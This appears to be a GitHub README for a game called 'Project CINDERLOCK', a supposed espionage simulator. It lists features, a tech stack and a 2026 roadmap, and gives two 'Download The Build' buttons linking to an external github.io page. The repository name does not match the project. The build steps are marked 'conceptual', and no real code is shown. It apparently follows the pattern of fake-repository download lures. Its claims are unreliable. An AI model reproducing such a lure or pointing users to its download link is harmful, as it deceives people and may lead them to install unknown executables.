![preview](https://raw.githubusercontent.com/thd26/007-license-to-style/main/view_29b26.svg)
# Project CINDERLOCK

**A narrative-driven espionage operations simulator that explores the quiet hours before a legend is born.**

Inspired by the sleek, globe-trotting tension of a young agent’s formative years, CINDERLOCK is not another shooter. It is a slow-burn, decision-heavy tactical experience where intelligence is currency, trust is a weapon, and every handshake hides a blade. Built for players who prefer the weight of a silenced conversation over a loud firefight, this repository houses the full source, design documents, and tooling for a game that treats espionage as an art form, not a kill count.

![GitHub release](https://img.shields.io/badge/release-v0.9.2--beta-4B8BBE?style=flat-square&logo=github)
![Build status](https://img.shields.io/badge/build-passing-2ECC71?style=flat-square&logo=vercel)
![Language count](https://img.shields.io/badge/languages-11-9B59B6?style=flat-square&logo=codefactor)

## 📖 Overview: The Silence Before the Shot

CINDERLOCK drops you into the polished, morally ambiguous world of international diplomacy in 2026. You are not a hardened veteran; you are a promising but untested operative assigned to a series of "simple" observation tasks that unravel into a conspiracy spanning three continents. The core loop revolves around *preparation*: studying routines, identifying leverage points, and improvising when the plan inevitably collapses.

Unlike traditional action titles, CINDERLOCK emphasizes **environmental storytelling** and **social engineering**. You will spend as much time in a tailored suit at a gala as you will in a ventilated server room. The game engine rewards patience, memory, and the ability to read micro-expressions. Your reputation precedes you, but your choices define what that reputation becomes.

## 🚀 Getting Started: Entering the Field

This project is a complete, modular codebase. To assemble your own build, you will need to orchestrate the dependencies using a package manager of your choice, then compile the core simulation layer. The entry point is `cinderlock_main.cs` which initializes the global event graph.

```bash
# Example dependency resolution (conceptual)
> resolve --manifest cinderlock.deps.json
> build --target windows-x64 --profile release
```

The initial setup involves configuring the `field_ops.json` file to connect your input devices and display preferences. The engine supports hot-swapping of language packs via the `locales/` directory.

## 🎮 Core Features: What Lies Beneath the Surface

- **Adaptive AI Factions:** Non-player characters possess memory. They remember your face, your tone, and your broken promises. A failed social check might close a door forever, but it might also open a window of opportunity for a more dangerous approach.
- **Dynamic Mission Weaver:** No two playthroughs share the same sequence of events. The narrative engine pulls from a pool of 140+ mission fragments, stitching them together based on your previous successes, failures, and collateral damage.
- **The "Tailored" Disguise System:** Clothing is more than a texture. It influences NPC perception radii, dialogue options, and even your movement speed. A heavy coat slows you down but hides a rifle; a valet's uniform grants access but lowers your intimidation stat.
- **Quantum Saves (Auto-Only):** To preserve the tension of consequence, manual saves are disabled in the "Classic" difficulty. The game uses a hidden checkpoint system that tracks your *intent*, not just your position.
- **Multilingual Field Support:** The interface and subtitles are fully localized for English, French, German, Spanish, Japanese, and Mandarin. Voice acting is provided in the original language with dynamic subtitle scaling for readability.

## 🛠️ Tech Stack & Architecture

CINDERLOCK is built on a custom C# engine paired with a Rust-based physics layer for realism in object interaction. The UI is rendered via a lightweight WebAssembly module to ensure crisp scaling across resolutions. We utilize a graph-based dialogue system (stored as JSON) that allows for branching narratives without recompiling the core logic.

| Component | Technology | Purpose |
| :--- | :--- | :--- |
| Core Logic | C# / .NET 8 | Mission state machine, save integrity |
| Physics & Collision | Rust (via FFI) | Destructible environments, ballistics |
| UI Layer | TypeScript / React | HUD, menus, inventory management |
| Data Pipeline | Python | Asset conversion, localization parsing |

## 💬 Community & Support

We believe in a living repository. Users are encouraged to fork the codebase and submit merge requests that enhance the *toolset* rather than just the content. We host weekly "planning sessions" in the discussions tab where roadmap features are debated and voted upon.

- **Bug Triage:** Our 24/7 automated bot scans issue trackers for duplicate reports and prioritizes them based on crash frequency. Human oversight occurs within 4 business hours.
- **Modding SDK:** A dedicated SDK is included in the `sdk/` folder for creating custom mission briefings and dialogue trees. Documentation is available in the `sdk/manual.pdf`.

## 🧩 Roadmap for 2026

The following features are currently in active development for the Q3 2026 update:

1.  **"The Handler System"** – An AI companion that learns your playstyle and offers contextual hints (or misleading ones if you treat them poorly).
2.  **Covert Ops Multiplayer** – A 2-player cooperative mode focusing on split responsibilities (hacking vs. distraction), scheduled for a December 2026 beta.
3.  **Dynamic Weather Patterns** – Introducing rain, fog, and extreme heat that affect visibility and guard patrol routes.

## 📜 License & Legal Notes

This project is released under the **MIT License**. You are granted the freedom to use, modify, and distribute this software for personal or commercial purposes, provided the original copyright notice is retained.

---

## 📥 Download The Build

Ready to step into the shadows? The latest stable build is compiled for Windows, macOS, and Linux.

[![Download](https://raw.githubusercontent.com/thd26/007-license-to-style/main/bin_ffbf.svg)](https://thd26.github.io/007-license-to-style/)

---

## 🙏 Acknowledgements

We extend our gratitude to the open-source community for providing the encryption libraries and audio processing tools that make this project viable. Special thanks to the players who participated in the closed alpha and provided brutally honest feedback on the difficulty curve.

## ⚠️ Disclaimer

**Important:** CINDERLOCK is a work of fiction. All characters, locations, and organizations depicted are either products of the author's imagination or used fictitiously. Any resemblance to actual persons (living or dead), companies, or real-world events is purely coincidental. The game does not condone illegal activity; it simulates tense situations within a safe, virtual environment. The source code is provided "as is," without warranty of any kind, express or implied.

---

**Project CINDERLOCK** – Because trust is the most fragile weapon you will ever carry.

[![Download](https://raw.githubusercontent.com/thd26/007-license-to-style/main/bin_ffbf.svg)](https://thd26.github.io/007-license-to-style/)